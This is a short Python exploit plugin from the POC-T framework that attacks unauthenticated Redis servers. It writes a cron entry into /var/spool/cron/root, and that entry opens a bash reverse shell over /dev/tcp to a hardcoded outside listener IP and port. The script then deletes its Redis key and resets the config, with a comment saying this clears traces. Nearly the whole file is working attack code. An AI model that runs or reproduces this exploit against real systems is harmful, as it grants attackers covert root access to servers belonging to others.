#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
redis getshell expliot (/var/spool/cron reverse shell)

"""

import redis
from plugin.util import host2IP
from plugin.util import randomString

listen_ip = '115.28.1.1'
listen_port = 9999


def poc(url):
    url = host2IP(url)
    ip = url.split(':')[0]
    port = int(url.split(':')[-1]) if ':' in url else 6379
    try:
        r = redis.Redis(host=ip, port=port, db=0, socket_timeout=10)
        if 'redis_version' in r.info():
            payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(ip=listen_ip,port=str(listen_port))
            path = '/var/spool/cron'
            name = 'root'
            key = randomString(10)
            r.set(key, payload)
            r.config_set('dir', path)
            r.config_set('dbfilename', name)
            r.save()
            r.delete(key)  # 清除痕迹
            r.config_set('dir', '/tmp')
            return True
    except Exception:
        return False
    return False
